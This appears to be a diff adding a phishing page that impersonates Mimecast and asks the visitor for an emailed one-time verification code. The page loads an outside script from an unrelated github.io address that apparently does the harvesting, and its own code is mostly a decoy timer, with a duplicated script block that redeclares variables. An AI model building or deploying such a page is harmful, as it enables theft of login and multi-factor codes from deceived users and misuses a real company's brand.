@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mimecast Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  background:#1f78d1;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+
+/* ===== LOGO ===== */
+.logo-bar{
+  width:100%;
+  padding:28px 0;
+  text-align:center;
+}
+
+.logo{
+  font-size:36px;
+  font-weight:800;
+  color:white;
+  letter-spacing:1px;
+}
+
+/* ===== CARD ===== */
+.card{
+  width:92%;
+  max-width:370px;
+  background:#fff;
+  border-radius:10px;
+  padding:22px;
+  box-shadow:0 6px 25px rgba(0,0,0,0.15);
+}
+
+h2{
+  margin:0 0 10px;
+}
+
+p{
+  font-size:13px;
+  color:#555;
+  margin-bottom:20px;
+}
+
+/* ===== OTP INPUTS ===== */
+.otp-box{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:20px;
+}
+
+.otp-box input{
+  width:350px;
+  height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+
+.otp-box input:focus{
+  outline:none;
+  border-color:#1f78d1;
+}
+
+/* ===== BUTTON STATES ===== */
+button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:6px;
+  font-size:15px;
+  font-weight:700;
+  color:white;
+  background:#9fc4eb;   /* 🔒 Locked */
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+button.active{
+  background:#1f78d1;   /* ✅ Active */
+  cursor:pointer;
+}
+
+/* ===== LINKS ===== */
+.links{
+  margin-top:16px;
+  text-align:center;
+}
+
+.links a{
+  color:#1f78d1;
+  font-size:13px;
+  text-decoration:none;
+  display:block;
+  margin-top:8px;
+}
+
+/* ===== FOOTER ===== */
+.footer{
+  color:white;
+  font-size:13px;
+  margin-top:22px;
+  text-align:center;
+  opacity:0.8;
+}
+</style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+<div class="logo-bar">
+  <div class="logo">mimecast</div>
+</div>
+
+<div class="card">
+  <h2>Verification Code</h2>
+  <p>Enter the digit verification code sent to your email.</p>
+<form>
+  <div class="otp-box">
+    <input type="text" maxlength="15" class="otp code" name="Otp code">
+  </div>
+
+  <button id="verifyBtn" disabled type="submit">Verify</button>
+</form>
+  <div class="links">
+    <a href="#">Resend Code</a>
+    <a href="index.html">Back to Login</a>
+  </div>
+</div>
+
+<div class="footer">
+  ©2025 Mimecast v1.17.0
+  <div>Privacy</div>
+</div>
+
+<!-- ✅ OTP LOGIC -->
+<script>
+const inputs = document.querySelectorAll(".otp");
+const verifyBtn = document.getElementById("verifyBtn");
+
+// Auto move to next input
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+    checkOTP();
+  });
+});
+
+// Enable Verify button only if all are filled
+function checkOTP(){
+  let filled = true;
+  inputs.forEach(input => {
+    if (input.value === "") filled = false;
+  });
+
+  if (filled) {
+    verifyBtn.classList.add("active");
+    verifyBtn.disabled = false;
+  } else {
+    verifyBtn.classList.remove("active");
+    verifyBtn.disabled = true;
+  }
+}
+</script>
+<script>
+const inputs = document.querySelectorAll(".otp");
+const verifyBtn = document.getElementById("verifyBtn");
+const resendLink = document.querySelector(".links a");
+
+// ================= OTP VERIFY LOGIC =================
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    if (input.value.length === 1 && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+    checkOTP();
+  });
+});
+
+function checkOTP(){
+  let filled = true;
+  inputs.forEach(input => {
+    if (input.value === "") filled = false;
+  });
+
+  if (filled) {
+    verifyBtn.classList.add("active");
+    verifyBtn.disabled = false;
+  } else {
+    verifyBtn.classList.remove("active");
+    verifyBtn.disabled = true;
+  }
+}
+
+// ================= RESEND TIMER SYSTEM =================
+let resendCount = 0;
+let baseTime = 30;  // first wait = 30 seconds
+let countdown;
+let timeLeft = baseTime;
+
+function startResendTimer() {
+  resendLink.style.pointerEvents = "none";
+  resendLink.style.opacity = "0.5";
+
+  timeLeft = baseTime + (resendCount * 30); // increases every request
+  resendLink.textContent = `Resend Code in ${timeLeft}s`;
+
+  countdown = setInterval(() => {
+    timeLeft--;
+    resendLink.textContent = `Resend Code in ${timeLeft}s`;
+
+    if (timeLeft <= 0) {
+      clearInterval(countdown);
+      resendLink.textContent = "Resend Code";
+      resendLink.style.pointerEvents = "auto";
+      resendLink.style.opacity = "1";
+    }
+  }, 1000);
+}
+
+// First load starts timer automatically
+startResendTimer();
+
+// When user clicks resend
+resendLink.addEventListener("click", (e) => {
+  e.preventDefault();
+
+  resendCount++;     // increase delay
+  startResendTimer(); // restart countdown
+
+  // 👉 OPTIONAL: Clear input field on resend
+  inputs.forEach(input => input.value = "");
+  verifyBtn.classList.remove("active");
+  verifyBtn.disabled = true;
+});
+</script>
+</body>
+</html>
